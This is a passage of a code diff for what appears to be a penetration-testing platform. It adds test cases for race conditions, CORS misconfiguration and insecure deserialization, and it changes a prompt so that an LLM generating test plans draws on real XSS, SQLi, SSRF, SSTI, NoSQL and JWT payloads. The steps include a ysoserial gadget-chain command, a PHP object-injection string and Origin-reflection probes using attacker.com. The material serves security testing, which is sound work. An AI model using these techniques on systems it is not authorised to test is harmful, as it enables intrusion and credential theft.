+            "Timing attack: use Last-Byte Sync in Turbo Intruder for precise race windows",
+        ],
+        "expected_result": "Database transactions use atomic operations. Idempotency keys prevent double-processing.",
+        "cwe": "CWE-362", "owasp": "A04:2021",
+        "tools": {},
+        "applicable_to": ["web", "api"],
+        "tags": ["race-condition", "toctou", "business-logic"],
+    },
+
+    # ── CORS ──────────────────────────────────────────────────────────────────
+    {
+        "id": "TC-PAT-CORS01",
+        "title": "CORS Misconfiguration — Origin Reflection & Credential Exposure",
+        "category": "Web Application",
+        "severity": "high",
+        "description": (
+            f"Test {len(CORS_SENSITIVE_PATHS)} sensitive API paths with {len(CORS_ATTACK_ORIGINS)} "
+            "origin bypass variants to detect CORS misconfigurations that allow cross-origin credential theft."
+        ),
+        "attack_pattern": "Supply arbitrary Origin headers; check if reflected in Access-Control-Allow-Origin with credentials.",
+        "steps": [
+            f"Test origins: {', '.join(CORS_ATTACK_ORIGINS[:6])}",
+            f"Sensitive paths: {', '.join(CORS_SENSITIVE_PATHS[:6])}",
+            "Send: Origin: https://attacker.com — check ACAO response header",
+            "If ACAO=attacker.com AND ACAC=true, exploit is trivial (XHR with credentials)",
+            "Test: Origin: null — some servers allow null origin (sandbox/file:// exploit)",
+            "Subdomain takeover CORS: Origin: sub.target.com — check if trusted subdomain wildcarded",
+        ],
+        "expected_result": "CORS allowlist is explicit. Credentials not exposed to untrusted origins.",
+        "cwe": "CWE-942", "owasp": "A05:2021",
+        "tools": {"nuclei_tags": ["cors", "misconfig"]},
+        "applicable_to": ["web", "api"],
+        "tags": ["cors", "headers", "misconfig"],
+    },
+
+    # ── Deserialization ───────────────────────────────────────────────────────
+    {
+        "id": "TC-PAT-DESER01",
+        "title": "Insecure Deserialization — RCE via Object Injection",
+        "category": "Advanced Injection",
+        "severity": "critical",
+        "description": (
+            f"Probe {len(DESERIALIZATION_PATHS)} deserialization-prone endpoints for "
+            "Java, PHP, Python pickle, and .NET serialization vulnerabilities."
+        ),
+        "attack_pattern": "Supply crafted serialized objects to gadget-chain endpoints to achieve RCE.",
+        "steps": [
+            f"Target paths: {', '.join(DESERIALIZATION_PATHS[:8])}",
+            "Java: look for 'rO0AB' base64 prefix (Java serialization magic bytes aced0005)",
+            "Tool: ysoserial to generate gadget chains — java -jar ysoserial.jar CommonsCollections6 'id' | base64",
+            "PHP: look for O:8:\"stdClass\" patterns in cookies, session storage, or POST bodies",
+            "PHP object injection: O:8:\"SomeClass\":1:{s:4:\"data\";s:7:\"payload\";}",
+            "Python pickle: look for __reduce__ exploitation patterns",
+            ".NET: check ViewState — decrypt with machineKey; inject TypeConfuseDelegate chain",
+        ],
+        "expected_result": "Deserialization uses integrity-checked, type-allowlisted parsers. No gadget chains reachable.",
+        "cwe": "CWE-502", "owasp": "A08:2021",
+        "tools": {"nuclei_tags": ["deserialization", "rce"]},
+        "applicable_to": ["web", "api"],
+        "tags": ["deserialization", "rce", "java", "php"],
+    },
+]
+
+# ─────────────────────────────────────────────────────────────────────────────
 # CVE → CWE category mapping (for NVD refresh)
 # ─────────────────────────────────────────────────────────────────────────────
 
@@ -3139,24 +3825,33 @@ async def _stream_refresh() -> AsyncGenerator[str, None]:
 # ─────────────────────────────────────────────────────────────────────────────
 
 def _filter_test_cases(target_types: list[str], tech_stack: list[str], scope: str | None) -> list[dict]:
+    all_cases = TEST_CASES + PATTERN_TEST_CASES
+
     if not target_types:
-        return TEST_CASES
+        return all_cases
 
     filtered = []
-    for tc in TEST_CASES:
+    seen_ids: set[str] = set()
+
+    for tc in all_cases:
         if any(t.lower() in tc.get("applicable_to", []) for t in target_types):
-            filtered.append(tc)
+            tc_id = tc["id"]
+            if tc_id not in seen_ids:
+                seen_ids.add(tc_id)
+                filtered.append(tc)
 
     cloud_keywords = {"aws", "gcp", "azure", "cloud", "s3", "lambda", "cloudfront"}
     if any(k in (t.lower() for t in tech_stack) for k in cloud_keywords):
-        for tc in TEST_CASES:
-            if tc not in filtered and "cloud" in tc.get("applicable_to", []):
+        for tc in all_cases:
+            if tc["id"] not in seen_ids and "cloud" in tc.get("applicable_to", []):
+                seen_ids.add(tc["id"])
                 filtered.append(tc)
 
     mobile_keywords = {"android", "ios", "react native", "flutter", "swift", "kotlin"}
     if any(k in (t.lower() for t in tech_stack) for k in mobile_keywords):
-        for tc in TEST_CASES:
-            if tc not in filtered and "mobile" in tc.get("applicable_to", []):
+        for tc in all_cases:
+            if tc["id"] not in seen_ids and "mobile" in tc.get("applicable_to", []):
+                seen_ids.add(tc["id"])
                 filtered.append(tc)
 
     return filtered
@@ -3198,7 +3893,15 @@ async def _stream_ai_testcases(payload: AIRequest) -> AsyncGenerator[str, None]:
     scope_desc   = payload.scope or "full application"
     threat_model = (f"\n\nTHREAT MODEL:\n{payload.threat_model[:4000]}" if payload.threat_model else "")
 
-    base_categories = list({tc["category"] for tc in TEST_CASES})
+    base_categories = list({tc["category"] for tc in TEST_CASES + PATTERN_TEST_CASES})
+
+    # Sample real payloads to anchor AI output to known-good patterns
+    _xss_sample   = json.dumps(XSS_PAYLOADS[:4])
+    _sqli_sample  = json.dumps(SQLI_ERROR_PAYLOADS[:4] + SQLI_TIME_PAYLOADS[:2])
+    _ssrf_sample  = json.dumps([u for u, _ in SSRF_TARGETS[:3]])
+    _ssti_sample  = json.dumps(SSTI_PAYLOADS[:4])
+    _nosql_sample = json.dumps(NOSQL_INJECTION_PAYLOADS[:3])
+    _jwt_sample   = json.dumps(JWT_ALG_NONE_VARIANTS[:3] + JWT_WEAK_SECRETS[:3])
 
     system_prompt = """You are a senior penetration tester generating a customized security test case plan.
 Respond with ONLY a valid JSON array — no markdown fences, no explanation.
@@ -3220,7 +3923,16 @@ Rules:
 4. At least 4 critical severity tests
 5. Cover: auth, authz, injection, config, secrets, business logic, and supply chain
 6. Tool nuclei_tags must match real nuclei template tags (cves, exposures, misconfig, etc.)
-7. Steps must be actionable with specific commands and payloads
+7. Steps must be actionable — include specific commands AND real payloads from the examples below
+8. Include at least one test case each for: XSS, SQLi, SSRF, SSTI, JWT, NoSQL if applicable
+
+Real payload examples to reference in your steps (use these, not made-up values):
+- XSS: {_xss_sample}
+- SQLi error+time: {_sqli_sample}
+- SSRF targets: {_ssrf_sample}
+- SSTI probes: {_ssti_sample}
+- NoSQL operators: {_nosql_sample}
+- JWT attacks: {_jwt_sample}
 
 Return ONLY the JSON array."""
 
@@ -3308,11 +4020,14 @@ async def library_stats(
     current_user: Annotated[User, Depends(get_current_user)],
 ) -> dict:
     from collections import Counter
-    categories = Counter(tc["category"] for tc in TEST_CASES)
-    severities = Counter(tc["severity"] for tc in TEST_CASES)
+    all_cases = TEST_CASES + PATTERN_TEST_CASES
+    categories = Counter(tc["category"] for tc in all_cases)
+    severities = Counter(tc["severity"] for tc in all_cases)
     return {
-        "total": len(TEST_CASES),
+        "total": len(all_cases),
+        "base_library": len(TEST_CASES),
+        "pattern_library": len(PATTERN_TEST_CASES),
         "categories": dict(categories),
         "severities": dict(severities),
-        "sources": ["OWASP WSTG", "PayloadsAllTheThings", "pentester.land patterns", "NVD CVE"],
+        "sources": ["OWASP WSTG", "PayloadsAllTheThings", "pentester.land patterns", "NVD CVE", "attack_patterns (5700+ bug bounty reports)"],
     }
